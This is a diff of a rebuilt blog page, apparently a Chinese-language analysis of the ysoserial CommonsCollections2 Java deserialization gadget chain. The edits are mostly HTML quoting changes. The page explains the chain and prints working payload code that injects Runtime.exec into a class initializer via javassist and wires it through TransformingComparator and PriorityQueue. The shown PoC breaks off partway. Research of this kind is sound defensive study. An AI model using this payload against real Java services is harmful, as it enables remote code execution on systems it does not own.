+		<span style=color:#75715e>// run command in static initializer
+</span><span style=color:#75715e></span>		<span style=color:#75715e>// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+</span><span style=color:#75715e></span>		String cmd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;java.lang.Runtime.getRuntime().exec(\&#34;&#34;</span> <span style=color:#f92672>+</span>
+		    command<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceAll</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\\\\&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;\\\\\\\\&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>replaceAll</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\&#34;&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;\\\&#34;&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>+</span>
+		    <span style=color:#e6db74>&#34;\&#34;);&#34;</span><span style=color:#f92672>;</span>
+		clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>makeClassInitializer</span><span style=color:#f92672>().</span><span style=color:#a6e22e>insertAfter</span><span style=color:#f92672>(</span>cmd<span style=color:#f92672>);</span>
+		<span style=color:#75715e>// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+</span><span style=color:#75715e></span>		clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>setName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;ysoserial.Pwner&#34;</span> <span style=color:#f92672>+</span> System<span style=color:#f92672>.</span><span style=color:#a6e22e>nanoTime</span><span style=color:#f92672>());</span>
+		CtClass superC <span style=color:#f92672>=</span> pool<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>abstTranslet<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
+		clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>setSuperclass</span><span style=color:#f92672>(</span>superC<span style=color:#f92672>);</span>
 </code></pre></div><p>这里用的方式是使用javassist辅助直接构造这个类，并且将命令执行的代码插入到静态构造器中。但是这里还做了一些其他事，最重要的是设置这个类的父类为AbstractTranslet。这是必须的，原因可以从前面的分析中得出：在defineTransletClasses方法中，使用defineClass加载类之后还有其他操作：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span> i <span style="color:#f92672">&lt;</span> classCount<span style="color:#f92672">;</span> i<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
-		_class<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> loader<span style="color:#f92672">.</span><span style="color:#a6e22e">defineClass</span><span style="color:#f92672">(</span>_bytecodes<span style="color:#f92672">[</span>i<span style="color:#f92672">]);</span>
-		<span style="color:#66d9ef">final</span> Class superClass <span style="color:#f92672">=</span> _class<span style="color:#f92672">[</span>i<span style="color:#f92672">].</span><span style="color:#a6e22e">getSuperclass</span><span style="color:#f92672">();</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0<span style=color:#f92672>;</span> i <span style=color:#f92672>&lt;</span> classCount<span style=color:#f92672>;</span> i<span style=color:#f92672>++)</span> <span style=color:#f92672>{</span>
+		_class<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> loader<span style=color:#f92672>.</span><span style=color:#a6e22e>defineClass</span><span style=color:#f92672>(</span>_bytecodes<span style=color:#f92672>[</span>i<span style=color:#f92672>]);</span>
+		<span style=color:#66d9ef>final</span> Class superClass <span style=color:#f92672>=</span> _class<span style=color:#f92672>[</span>i<span style=color:#f92672>].</span><span style=color:#a6e22e>getSuperclass</span><span style=color:#f92672>();</span>
 		
-		<span style="color:#75715e">// Check if this is the main class
-</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>superClass<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">().</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>ABSTRACT_TRANSLET<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
-			  _transletIndex <span style="color:#f92672">=</span> i<span style="color:#f92672">;</span>
-		<span style="color:#f92672">}</span>
-		<span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
-			  _auxClasses<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>_class<span style="color:#f92672">[</span>i<span style="color:#f92672">].</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">(),</span> _class<span style="color:#f92672">[</span>i<span style="color:#f92672">]);</span>
-		<span style="color:#f92672">}</span>
-<span style="color:#f92672">}</span>
+		<span style=color:#75715e>// Check if this is the main class
+</span><span style=color:#75715e></span>		<span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>superClass<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>().</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>ABSTRACT_TRANSLET<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+			  _transletIndex <span style=color:#f92672>=</span> i<span style=color:#f92672>;</span>
+		<span style=color:#f92672>}</span>
+		<span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+			  _auxClasses<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>_class<span style=color:#f92672>[</span>i<span style=color:#f92672>].</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> _class<span style=color:#f92672>[</span>i<span style=color:#f92672>]);</span>
+		<span style=color:#f92672>}</span>
+<span style=color:#f92672>}</span>
 	
-<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>_transletIndex <span style="color:#f92672">&lt;</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-		ErrorMsg err<span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg<span style="color:#f92672">(</span>ErrorMsg<span style="color:#f92672">.</span><span style="color:#a6e22e">NO_MAIN_TRANSLET_ERR</span><span style="color:#f92672">,</span> _name<span style="color:#f92672">);</span>
-		<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException<span style="color:#f92672">(</span>err<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
-<span style="color:#f92672">}</span>
+<span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_transletIndex <span style=color:#f92672>&lt;</span> 0<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+		ErrorMsg err<span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg<span style=color:#f92672>(</span>ErrorMsg<span style=color:#f92672>.</span><span style=color:#a6e22e>NO_MAIN_TRANSLET_ERR</span><span style=color:#f92672>,</span> _name<span style=color:#f92672>);</span>
+		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException<span style=color:#f92672>(</span>err<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>可以看到，这里会检查加载的类的父类是否为ABSTRACT_TRANSLET，并且使用_transletIndex 保存 index；如果没有一个符合条件甚至会抛出错误。除此之外，在实例化对象时，实例化的对象也是_class[_transletIndex]，这就意味着只有 AbstractTranslet的子类才会被实例化。所以，为了能够实例化这个对象，需要在构造类时设置AbstractTranslet为父类。</p>
 <p>OK，如何由TransformingComparator#compare触发命令执行已经分析完了，现在再捋一遍：</p>
 <ol>
@@ -290,106 +270,88 @@ Reflections<span style="color:#f92672">.</span><span style="color:#a6e22e">setFi
 <li>当用TransformingComparator.compare()时，如果参数为templates，触发InvokerTransformer.transform(templates)，进而执行templates.newTransformer方法；</li>
 </ol>
 <p>所以之后就是如何使得反序列化过程中调用TransformingComparator.compare()，并且参数参数为templates了。</p>
-<h2 id="priorityqueue反序列化调用transformingcomparatorcompare">PriorityQueue反序列化调用TransformingComparator.compare()</h2>
+<h2 id=priorityqueue反序列化调用transformingcomparatorcompare>PriorityQueue反序列化调用TransformingComparator.compare()</h2>
 <p>回到CC2链中，可以看到使用的时PriorityQueue，查看这个类的readObject方法，可以知道其最后调用了一个heapify方法对队列中的数据进行一个排序处理；查看这个方法：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">heapify</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
-    <span style="color:#66d9ef">final</span> Object<span style="color:#f92672">[]</span> es <span style="color:#f92672">=</span> queue<span style="color:#f92672">;</span>
-    <span style="color:#66d9ef">int</span> n <span style="color:#f92672">=</span> size<span style="color:#f92672">,</span> i <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>n <span style="color:#f92672">&gt;&gt;&gt;</span> 1<span style="color:#f92672">)</span> <span style="color:#f92672">-</span> 1<span style="color:#f92672">;</span>
-    <span style="color:#66d9ef">final</span> Comparator<span style="color:#f92672">&lt;?</span> <span style="color:#66d9ef">super</span> E<span style="color:#f92672">&gt;</span> cmp<span style="color:#f92672">;</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">((</span>cmp <span style="color:#f92672">=</span> comparator<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span>
-        <span style="color:#66d9ef">for</span> <span style="color:#f92672">(;</span> i <span style="color:#f92672">&gt;=</span> 0<span style="color:#f92672">;</span> i<span style="color:#f92672">--)</span>
-            siftDownComparable<span style="color:#f92672">(</span>i<span style="color:#f92672">,</span> <span style="color:#f92672">(</span>E<span style="color:#f92672">)</span> es<span style="color:#f92672">[</span>i<span style="color:#f92672">],</span> es<span style="color:#f92672">,</span> n<span style="color:#f92672">);</span>
-    <span style="color:#66d9ef">else</span>
-        <span style="color:#66d9ef">for</span> <span style="color:#f92672">(;</span> i <span style="color:#f92672">&gt;=</span> 0<span style="color:#f92672">;</span> i<span style="color:#f92672">--)</span>
-            siftDownUsingComparator<span style="color:#f92672">(</span>i<span style="color:#f92672">,</span> <span style="color:#f92672">(</span>E<span style="color:#f92672">)</span> es<span style="color:#f92672">[</span>i<span style="color:#f92672">],</span> es<span style="color:#f92672">,</span> n<span style="color:#f92672">,</span> cmp<span style="color:#f92672">);</span>
-<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>heapify</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>final</span> Object<span style=color:#f92672>[]</span> es <span style=color:#f92672>=</span> queue<span style=color:#f92672>;</span>
+    <span style=color:#66d9ef>int</span> n <span style=color:#f92672>=</span> size<span style=color:#f92672>,</span> i <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>n <span style=color:#f92672>&gt;&gt;&gt;</span> 1<span style=color:#f92672>)</span> <span style=color:#f92672>-</span> 1<span style=color:#f92672>;</span>
+    <span style=color:#66d9ef>final</span> Comparator<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>super</span> E<span style=color:#f92672>&gt;</span> cmp<span style=color:#f92672>;</span>
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>((</span>cmp <span style=color:#f92672>=</span> comparator<span style=color:#f92672>)</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span>
+        <span style=color:#66d9ef>for</span> <span style=color:#f92672>(;</span> i <span style=color:#f92672>&gt;=</span> 0<span style=color:#f92672>;</span> i<span style=color:#f92672>--)</span>
+            siftDownComparable<span style=color:#f92672>(</span>i<span style=color:#f92672>,</span> <span style=color:#f92672>(</span>E<span style=color:#f92672>)</span> es<span style=color:#f92672>[</span>i<span style=color:#f92672>],</span> es<span style=color:#f92672>,</span> n<span style=color:#f92672>);</span>
+    <span style=color:#66d9ef>else</span>
+        <span style=color:#66d9ef>for</span> <span style=color:#f92672>(;</span> i <span style=color:#f92672>&gt;=</span> 0<span style=color:#f92672>;</span> i<span style=color:#f92672>--)</span>
+            siftDownUsingComparator<span style=color:#f92672>(</span>i<span style=color:#f92672>,</span> <span style=color:#f92672>(</span>E<span style=color:#f92672>)</span> es<span style=color:#f92672>[</span>i<span style=color:#f92672>],</span> es<span style=color:#f92672>,</span> n<span style=color:#f92672>,</span> cmp<span style=color:#f92672>);</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>这里当存在comparator时，同时i≥0（即size≥2）时就会调用siftDownUsingComparator方法，而在这个方法中，就回到用到comparator.compare() 方法：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">siftDownUsingComparator</span><span style="color:#f92672">(</span>
-    <span style="color:#66d9ef">int</span> k<span style="color:#f92672">,</span> T x<span style="color:#f92672">,</span> Object<span style="color:#f92672">[]</span> es<span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span> n<span style="color:#f92672">,</span> Comparator<span style="color:#f92672">&lt;?</span> <span style="color:#66d9ef">super</span> T<span style="color:#f92672">&gt;</span> cmp<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-    <span style="color:#75715e">// assert n &gt; 0;
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> half <span style="color:#f92672">=</span> n <span style="color:#f92672">&gt;&gt;&gt;</span> 1<span style="color:#f92672">;</span>
-    <span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span>k <span style="color:#f92672">&lt;</span> half<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
-        <span style="color:#66d9ef">int</span> child <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>k <span style="color:#f92672">&lt;&lt;</span> 1<span style="color:#f92672">)</span> <span style="color:#f92672">+</span> 1<span style="color:#f92672">;</span>
-        Object c <span style="color:#f92672">=</span> es<span style="color:#f92672">[</span>child<span style="color:#f92672">];</span>
-        <span style="color:#66d9ef">int</span> right <span style="color:#f92672">=</span> child <span style="color:#f92672">+</span> 1<span style="color:#f92672">;</span>
-        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>right <span style="color:#f92672">&lt;</span> n <span style="color:#f92672">&amp;&amp;</span> cmp<span style="color:#f92672">.</span><span style="color:#a6e22e">compare</span><span style="color:#f92672">((</span>T<span style="color:#f92672">)</span> c<span style="color:#f92672">,</span> <span style="color:#f92672">(</span>T<span style="color:#f92672">)</span> es<span style="color:#f92672">[</span>right<span style="color:#f92672">])</span> <span style="color:#f92672">&gt;</span> 0<span style="color:#f92672">)</span>
-            c <span style="color:#f92672">=</span> es<span style="color:#f92672">[</span>child <span style="color:#f92672">=</span> right<span style="color:#f92672">];</span>
-        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>cmp<span style="color:#f92672">.</span><span style="color:#a6e22e">compare</span><span style="color:#f92672">(</span>x<span style="color:#f92672">,</span> <span style="color:#f92672">(</span>T<span style="color:#f92672">)</span> c<span style="color:#f92672">)</span> <span style="color:#f92672">&lt;=</span> 0<span style="color:#f92672">)</span>
-            <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
-        es<span style="color:#f92672">[</span>k<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> c<span style="color:#f92672">;</span>
-        k <span style="color:#f92672">=</span> child<span style="color:#f92672">;</span>
-    <span style="color:#f92672">}</span>
-    es<span style="color:#f92672">[</span>k<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> x<span style="color:#f92672">;</span>
-<span style="color:#f92672">}</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>siftDownUsingComparator</span><span style=color:#f92672>(</span>
+    <span style=color:#66d9ef>int</span> k<span style=color:#f92672>,</span> T x<span style=color:#f92672>,</span> Object<span style=color:#f92672>[]</span> es<span style=color:#f92672>,</span> <span style=color:#66d9ef>int</span> n<span style=color:#f92672>,</span> Comparator<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>super</span> T<span style=color:#f92672>&gt;</span> cmp<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+    <span style=color:#75715e>// assert n &gt; 0;
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>int</span> half <span style=color:#f92672>=</span> n <span style=color:#f92672>&gt;&gt;&gt;</span> 1<span style=color:#f92672>;</span>
+    <span style=color:#66d9ef>while</span> <span style=color:#f92672>(</span>k <span style=color:#f92672>&lt;</span> half<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>int</span> child <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>k <span style=color:#f92672>&lt;&lt;</span> 1<span style=color:#f92672>)</span> <span style=color:#f92672>+</span> 1<span style=color:#f92672>;</span>
+        Object c <span style=color:#f92672>=</span> es<span style=color:#f92672>[</span>child<span style=color:#f92672>];</span>
+        <span style=color:#66d9ef>int</span> right <span style=color:#f92672>=</span> child <span style=color:#f92672>+</span> 1<span style=color:#f92672>;</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>right <span style=color:#f92672>&lt;</span> n <span style=color:#f92672>&amp;&amp;</span> cmp<span style=color:#f92672>.</span><span style=color:#a6e22e>compare</span><span style=color:#f92672>((</span>T<span style=color:#f92672>)</span> c<span style=color:#f92672>,</span> <span style=color:#f92672>(</span>T<span style=color:#f92672>)</span> es<span style=color:#f92672>[</span>right<span style=color:#f92672>])</span> <span style=color:#f92672>&gt;</span> 0<span style=color:#f92672>)</span>
+            c <span style=color:#f92672>=</span> es<span style=color:#f92672>[</span>child <span style=color:#f92672>=</span> right<span style=color:#f92672>];</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>cmp<span style=color:#f92672>.</span><span style=color:#a6e22e>compare</span><span style=color:#f92672>(</span>x<span style=color:#f92672>,</span> <span style=color:#f92672>(</span>T<span style=color:#f92672>)</span> c<span style=color:#f92672>)</span> <span style=color:#f92672>&lt;=</span> 0<span style=color:#f92672>)</span>
+            <span style=color:#66d9ef>break</span><span style=color:#f92672>;</span>
+        es<span style=color:#f92672>[</span>k<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> c<span style=color:#f92672>;</span>
+        k <span style=color:#f92672>=</span> child<span style=color:#f92672>;</span>
+    <span style=color:#f92672>}</span>
+    es<span style=color:#f92672>[</span>k<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> x<span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
 </code></pre></div><p>因此，只要设置PriorityQueue的comparator为我们构造好的TransformingComparator，就可以在反序列化过程中触发compare()方法。</p>
 <p>接下来就是能不能设置templates为compare的参数了，这里比较的对象为x和c，追溯来源可以知道两者PriorityQueue中队列的元素，也就是queue的元素。所以也就是设置PriorityQueue的queue元素为templates。但是需要注意，需要设置第一个元素为templates，否则的话在compare()中会先处理另一个对象，这很有可能导致出现异常终止，也就无法触发后面的调用链；当然也可队列元素都设成templates，这样就肯定会触发了。</p>
-<h2 id="poc验证">PoC验证</h2>
+<h2 id=poc验证>PoC验证</h2>
 <p>捋清楚了这条链，接下来尝试重新编写一下PoC：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Queue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">getObject</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> String command<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
-    <span style="color:#75715e">// TemplatesImpl requires the Class from bytecodes must be a subclass of AbstractTranslet.
-</span><span style="color:#75715e"></span>    Class absTranslet <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&#34;</span><span style="color:#f92672">);</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Queue<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>getObject</span><span style=color:#f92672>(</span><span style=color:#66d9ef>final</span> String command<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+    <span style=color:#75715e>// TemplatesImpl requires the Class from bytecodes must be a subclass of AbstractTranslet.
+</span><span style=color:#75715e></span>    Class absTranslet <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&#34;</span><span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// Generate the bytecodes using Javassist
-</span><span style="color:#75715e"></span>    ClassPool pool <span style="color:#f92672">=</span> ClassPool<span style="color:#f92672">.</span><span style="color:#a6e22e">getDefault</span><span style="color:#f92672">();</span>
-    pool<span style="color:#f92672">.</span><span style="color:#a6e22e">insertClassPath</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> ClassClassPath<span style="color:#f92672">(</span>absTranslet<span style="color:#f92672">));</span>
-    CtClass clazz <span style="color:#f92672">=</span> pool<span style="color:#f92672">.</span><span style="color:#a6e22e">makeClass</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;CommonsCollections2&#34;</span><span style="color:#f92672">);</span>
-    clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">makeClassInitializer</span><span style="color:#f92672">().</span><span style="color:#a6e22e">insertAfter</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime.getRuntime().exec(\&#34;&#34;</span> <span style="color:#f92672">+</span> command <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;);&#34;</span><span style="color:#f92672">);</span>
-    clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">setSuperclass</span><span style="color:#f92672">(</span>pool<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>absTranslet<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">()));</span>
-    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytecodes <span style="color:#f92672">=</span> clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">toBytecode</span><span style="color:#f92672">();</span>
+    <span style=color:#75715e>// Generate the bytecodes using Javassist
+</span><span style=color:#75715e></span>    ClassPool pool <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
+    pool<span style=color:#f92672>.</span><span style=color:#a6e22e>insertClassPath</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> ClassClassPath<span style=color:#f92672>(</span>absTranslet<span style=color:#f92672>));</span>
+    CtClass clazz <span style=color:#f92672>=</span> pool<span style=color:#f92672>.</span><span style=color:#a6e22e>makeClass</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;CommonsCollections2&#34;</span><span style=color:#f92672>);</span>
+    clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>makeClassInitializer</span><span style=color:#f92672>().</span><span style=color:#a6e22e>insertAfter</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;java.lang.Runtime.getRuntime().exec(\&#34;&#34;</span> <span style=color:#f92672>+</span> command <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;\&#34;);&#34;</span><span style=color:#f92672>);</span>
+    clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>setSuperclass</span><span style=color:#f92672>(</span>pool<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>absTranslet<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()));</span>
+    <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytecodes <span style=color:#f92672>=</span> clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>();</span>
 
-    <span style="color:#75715e">// Use reflection setting _Bytecodes and _name
-</span><span style="color:#75715e"></span>    TemplatesImpl templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl<span style="color:#f92672">();</span>
-    setFieldValue<span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_bytecodes&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]{</span>bytecodes<span style="color:#f92672">});</span>
-    setFieldValue<span style="color:#f92672">(</span>templates<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_name&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;CommonsCollections2&#34;</span><span style="color:#f92672">);</span>
+    <span style=color:#75715e>// Use reflection setting _Bytecodes and _name
+</span><span style=color:#75715e></span>    TemplatesImpl templates <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TemplatesImpl<span style=color:#f92672>();</span>
+    setFieldValue<span style=color:#f92672>(</span>templates<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;_bytecodes&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]{</span>bytecodes<span style=color:#f92672>});</span>
+    setFieldValue<span style=color:#f92672>(</span>templates<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;_name&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;CommonsCollections2&#34;</span><span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// Create TransformingComparator, set Transformer as InvokerTransformer and the method to be called
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// is newTransformer
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">final</span> TransformingComparator comparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator<span style="color:#f92672">(</span>
-            <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;newTransformer&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{},</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{})</span>
-    <span style="color:#f92672">);</span>
+    <span style=color:#75715e>// Create TransformingComparator, set Transformer as InvokerTransformer and the method to be called
+</span><span style=color:#75715e></span>    <span style=color:#75715e>// is newTransformer
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>final</span> TransformingComparator comparator <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TransformingComparator<span style=color:#f92672>(</span>
+            <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;newTransformer&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{},</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{})</span>
+    <span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// Construct PriorityQueue, which requires no less than two elements, or sets its size to 2.
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Use the reflection settings comparator, and queue&#39;s first element is templates.
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">final</span> PriorityQueue queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">(</span>2<span style="color:#f92672">);</span>
-    queue<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span>1<span style="color:#f92672">);</span>
-    queue<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span>2<span style="color:#f92672">);</span>
-    setFieldValue<span style="color:#f92672">(</span>queue<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;comparator&#34;</span><span style="color:#f92672">,</span> comparator<span style="color:#f92672">);</span>
-    setFieldValue<span style="color:#f92672">(</span>queue<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;queue&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span>templates<span style="color:#f92672">,</span> 1<span style="color:#f92672">});</span>
